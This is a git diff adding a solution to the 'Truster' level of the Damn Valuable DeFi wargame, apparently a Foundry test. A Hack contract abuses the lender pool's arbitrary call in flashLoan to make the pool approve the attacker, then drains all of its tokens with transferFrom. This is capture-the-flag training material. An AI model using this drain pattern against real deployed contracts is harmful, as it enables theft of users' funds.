@@ -4,6 +4,7 @@ pragma solidity >=0.8.0;
 import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
 
+import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../../src/Contracts/truster/TrusterLenderPool.sol";
 
@@ -41,7 +42,13 @@ contract Truster is Test {
         /**
          * EXPLOIT START *
          */
+        console.log("Attacker address", attacker);
 
+        Hack hack = new Hack();
+        console.log("Hack contract address", address(hack));
+        
+        vm.prank(attacker);
+        hack.attack(address(trusterLenderPool),address(dvt));
         /**
          * EXPLOIT END *
          */
@@ -55,3 +62,23 @@ contract Truster is Test {
         assertEq(dvt.balanceOf(address(attacker)), TOKENS_IN_POOL);
     }
 }
+
+
+
+contract Hack {
+     TrusterLenderPool  trusterLenderPool;
+  
+
+    function attack( address _trusterLenderPool, address _dvt) public {
+        trusterLenderPool = TrusterLenderPool(_trusterLenderPool);
+        
+        uint256 TOKENS_IN_POOL = IERC20(_dvt).balanceOf(address(trusterLenderPool));
+
+        bytes memory approve = abi.encodeWithSignature("approve(address,uint256)", address(this), TOKENS_IN_POOL);
+ 
+        trusterLenderPool.flashLoan(0,msg.sender,address(_dvt),approve);
+        IERC20(_dvt).transferFrom(address(trusterLenderPool),msg.sender,TOKENS_IN_POOL);
+
+   
+
+    }}
